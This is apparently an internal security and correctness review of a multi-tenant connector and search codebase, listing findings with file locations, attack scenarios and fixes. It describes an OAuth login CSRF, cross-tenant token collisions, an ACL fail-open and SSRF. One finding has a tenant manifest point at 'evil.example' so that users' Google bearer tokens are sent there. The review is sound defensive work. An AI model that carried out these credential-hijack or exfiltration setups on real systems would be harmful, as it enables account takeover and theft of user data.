# Opus review: five features (2026-11-02)

Read-only review at contract and correctness level. Base: origin/main at 6285236.
Scope: features/rank, features/graph-store, tools/integration (reindex, zone-gate),
apps/connections (catalog, accounts routes, OAuth, token file), and the ACL path they share.

## Verdict

5 high, 6 medium, 7 low. Two highs are cross-user credential bugs in apps/connections (H1, H2).
One high is an ACL fail-open in rank (H3). One high is an architecture conflict with ADR 0004/0005 (H4).
Structure rules pass. Tests are behavioral, but no test covers H1, H2, H3, H5 or M-a.

Already ticketed and not repeated here: change-cursor CAS (M1/M2), namespacing (M3),
symlink ACL bypass (M4), graph-sync cross-process CAS, rank leaks listed in its README.

## Findings

| ID | Severity | Area | One line |
|----|----------|------|----------|
| H1 | High | connections OAuth | Login CSRF binds a victim's Google token to the attacker's account |
| H2 | High | connections catalog | A tenant custom id "google" borrows the server OAuth client |
| H3 | High | rank reindex | ACL change without version change keeps revoked readers in rank |
| H4 | High | architecture | rank and tools/integration contradict ADR 0004 and ADR 0005 |
| H5 | High | connections tokens | Token file keys by user only, so tenants collide |
| M-a | Medium | accounts PATCH | Missing manifest makes the live-recheck check pass |
| M-b | Medium | accounts PATCH | Narrowing dataZone leaves company-wide edges in the graph |
| M-c | Medium | catalog | Custom endpoint and tokenURL allow internal hosts (SSRF) |
| M-d | Medium | graph-store reach | Cost is not bounded by limit; N+1 lookups |
| M-e | Medium | graph-store spec | Spec says bi-temporal; code is single-axis |
| M-f | Medium | OAuth refresh | Concurrent syncs race on rotating refresh tokens |
| L1-L7 | Low | various | See the low section |

### H1. OAuth login CSRF binds a foreign token to the caller

- Where: apps/connections/src/oauth/routes.ts:17-31 (start stores state bound to the bearer
  caller), :32-61 (callback checks state only, no bearer, no browser binding);
  apps/connections/src/ui/oauth-ui.ts:11-17 (`start-url` returns the authorize URL as JSON).
- Scenario: attacker in tenant t1 calls `GET /v1/oauth/drive/start-url` and sends the URL to
  victim. Victim consents. The callback looks up state, finds `pend.caller = attacker`, and
  creates an account owned by the attacker that holds the victim's Drive token. The attacker
  now syncs the victim's files into the attacker's view.
- Fix: at start, set an HttpOnly, SameSite=Lax, signed cookie holding hash(state) and the
  caller. At callback, require the cookie and a match; otherwise 400. Add a test that a
  callback without the cookie, or with another caller's cookie, creates no account.

### H2. A tenant manifest named "google" borrows the server OAuth client

- Where: apps/connections/src/catalog/parse.ts:18-24 states a tenant cannot borrow the server
  client. apps/connections/src/oauth/providers.ts:19 uses `appOf = m.auth.app ?? m.id`, and
  :22-23 `manifestFor` prefers `catalog.get(name, tenant)`. Builtin ids are github, drive,
  slack, gmail; app names are github, google, slack. The connectors registry rejects only
  duplicate ids, so a custom id "google" registers.
- Scenario: a tenant admin posts `/v1/catalog` with `id: "google"`, `auth.kind: "oauth2"`,
  full Drive and Gmail scopes, and `endpoint: "https://evil.example"`. Users who start
  `/v1/oauth/google/start` get the server's Google client with the tenant's scopes. Sync uses
  the custom manifest and sends `Authorization: Bearer <google token>` to evil.example/list
  (connectors src http.ts:18-23, :46).
- Fix: resolve `appOf` only for builtin manifests. Reject custom ids equal to any builtin id
  or configured app name. Make `providerFor` refuse tenant manifests for server apps. Add a
  test; shared-oauth.test.ts covers only a builtin-registered "suite".

### H3. Rank keeps revoked readers when the ACL changes but the version does not

- Where: tools/integration/src/reindex.ts:34-36 diffs on `n.version` plus the zone tag.
  graph-sync write/document.ts:50-59 sets node version from the source version.
  write/access.ts:18-31 changes only can-read edges. write/skip.ts:19-28 `revoke()` closes the
  can-read edges of a skipped doc and leaves the node version as it was.
- Scenario A: any connector whose version ignores ACL (Drive modifiedTime does not change on
  a permission change). Remove bob from a file. The graph drops bob's edge. Reindex sees the
  same version, skips the doc, and rank still returns it to `user:bob`.
- Scenario B (folder connector, in repo): a doc is indexed for [ana, bob]. A later edit makes
  the node invalid (title over 512 bytes, or a control character). graph-sync skips it and
  revokes all edges. The node version is unchanged, so reindex keeps the old postings and bob
  still gets hits. This contradicts "fail closed".
- Why tests pass: tools/integration/tests/integration/acl/acl.test.ts:47-58 passes only because
  features/connector-kit/src/connectors/folder-acl.ts:36-37 folds an ACL fingerprint into the
  version.
- Fix: put a hash of the sorted can-read reader set into the reindex tag, or have graph-sync
  bump `props.aclVersion` on every edge change. Add a test with a connector whose version
  ignores the ACL, and a skip-then-revoke test.

### H4. rank and tools/integration contradict ADR 0004 and ADR 0005

- Where: features/rank (commit 926493b, 13:52) and tools/integration (584bdd4, 17:53) landed
  after ADR 0005 (9cd6e38, 10:48). ADR 0005 says RAG and "tools integration" left this repo and
  lists the brain packages as change-cursor, connector-kit, core-types, graph-store,
  graph-sync, query-router, zone-policy.
- Detail: rank is a keyed BM25F index over body tokens (features/rank/src/store/write.ts:25-40),
  which is the "pointer index / hybrid search" ADR 0004 assigns to rag.
  tools/integration/src/reindex.ts:41 fetches full text with the hardcoded token
  "integration" for every principal, the opposite of the ADR rule that the user's own token
  is checked live. README.md:27 says the brain never holds text. The rank spec says "our
  proposal, no exact source", against the exact-sources rule.
- Fix: decide in a new ADR. Either amend ADR 0004/0005 to admit rank, or move rank and
  reindex to anvesx/rag. In both cases, remove the hardcoded token from src.

### H5. Token file merges tenants that share a user name

- Where: apps/connections/src/tokens/write-token-file.ts:14-18 keys entries by `s.owner` only.
  `store.secrets()` (apps/connections/src/accounts/store.ts:57-67) spans all tenants. Bearer
  users are tenant-scoped (apps/connections/src/http/auth.ts:5, :12).
- Scenario: user "ana" in t1 and user "ana" in t2 both connect github. Both land under "ana".
  The bare "github" key goes to the older account, which may be the other tenant's. The brain
  acting for t2:ana uses t1:ana's token.
- Fix: key by `tenant:user`, or nest by tenant. Add a two-tenant test; write-token-file.test.ts
  and source-keys.test.ts use only t1. May overlap M3 if M3 already covers token-file keys.

### M-a. PATCH passes the live-recheck check when the manifest is missing

- Where: apps/connections/src/http/accounts-routes.ts:40-45,
  `liveRecheck = manifest ? hasLiveRecheck(manifest) : true`. Same default at :26.
- Scenario: the custom catalog is in memory (http/app.ts:18 builds a fresh registry on each
  start). Accounts persist. After a restart, an admin PATCHes a custom account without
  canRead to `access: company`. The check passes. Re-registering the manifest keeps it company.
- Fix: default to false, or return 409 when the manifest is absent. Persist the custom catalog.

### M-b. Narrowing dataZone does not retract graph edges

- Where: apps/connections/src/http/accounts-routes.ts:42-48 updates the zone only.
  The graph keeps reader edges written under company (graph/stamp.ts:10-23) until the next
  manual sync.
- Fix: on narrowing, call `closeAccountEdges` (sync/data/disconnect.ts:7-16), or trigger a
  resync and mark the account stale until it finishes.

### M-c. Custom connectors can point at internal hosts

- Where: apps/connections/src/catalog/parse.ts:14-16 allows any https host (10.x, 169.254.x,
  internal names) and http loopback. The server fetches endpoint and tokenURL.
- Mitigation today: the server binds 127.0.0.1 (http/serve.ts:8).
- Fix: outside dev mode, reject private, link-local and loopback targets after DNS resolution,
  and pin the resolved address for the request.

### M-d. reach cost is not bounded by limit

- Where: features/graph-store/src/edges/reach.ts:38-47 adds missing targets to `seen` without
  counting them. Edges may point at nodes that do not exist (README). Each target costs one
  `get()` query (N+1). The comment at line 14 says cost is capped by limit; it is not.
- Scenario: a node with 50,000 edges to missing targets and `limit: 10` runs 50,000 queries.
- Fix: cap expanded edges (for example limit times a fixed factor, plus an absolute cap) and
  batch node lookups.

### M-e. graph-store spec claims bi-temporal validity

- Where: docs/specs/feature/graph-store.md:5, :8 claim "bi-temporal validity" and cite the Meta
  exact source; the Meta card line 31 repeats it. The README and the DDL in src/index.ts have
  one axis (valid_from, valid_to).
- Fix: correct the spec and card, or add `recorded_at`.

### M-f. Concurrent syncs race on refresh

- Where: apps/connections/src/sync/route.ts:23 refreshes on every sync.
  oauth/state/refresh.ts:30-32 marks the account needs-auth on refresh failure.
- Scenario: two syncs run at once on a provider that rotates refresh tokens. The second
  refresh uses a spent token, fails, and the account drops to needs-auth.
- Fix: a per-account mutex, and refresh only near expiry.

### Low

| ID | Where | Issue | Fix |
|----|-------|-------|-----|
| L1 | graph-store nodes.ts:51-59, :38, :70 | Revive or backdate after a tombstone inserts an overlapping row; `at.get` then returns an arbitrary row. Same for edges. | Check against max(valid_to) of history |
| L2 | graph-store nodes.ts:7-16 | ROLLBACK can throw and hide the original error | Reuse rank's `abandon()` (store/tx.ts:4-10) |
| L3 | validation/fields.ts:7 | `hasControl` misses U+0080-009F and U+2028/2029 | Extend the class |
| L4 | rank store/schema.ts:24-35; validate.ts:73-77 | A non-SQLite or old file gives a raw SQLite error, not BAD_INDEX; any 16-byte string is a key | Map open errors; document or enforce key entropy |
| L5 | connections http/auth.ts:5, :16 | Bearer exp allows 12 digits; no max lifetime | Cap lifetime |
| L6 | tools/integration zone-gate.ts:10-17 | Drops principals not prefixed user: or team: (fail closed, but coupled to the test resolver) | Document the prefix contract |
| L7 | oauth/routes.ts:39; oauth-ui.ts:22 | Provider `error` text is reflected unbounded into JSON and a redirect param | Map to a fixed code set |

## What passed

- Structure: `node tools/structure-lint/bin/cli.mjs` reports 15 packages, 507 files,
  154 folders, no violations. graph-store src/index.ts is exactly 80 lines.
- rank applies the ACL pre-filter in every read statement (read.ts), fails closed on a bad
  asker, and has a canary test.
- Credentials are sealed with AES-256-GCM using the account id as AAD and are never returned.
- The token file is written mode 600 with an atomic rename.
- UI static serving uses an allowlist (ui/routes.ts:20-60); no path traversal.
- Tests run real temp SQLite stacks and assert outcomes, not code shape.

## Not reviewed

- apps/brain; graph-sync beyond write/ and sync.ts (lease, membership); change-cursor;
  query-router; connector-kit beyond folder-acl.ts.
- The external @anvesx/connectors adapters (github, drive, slack, gmail) beyond registry.ts
  and http.ts.
- apps/connections ui/public JS, cli/bin.ts, index.ts; e2e tests; rank eval and bench;
  Stryker configs.
- No tests were executed and mutation scores were not checked.
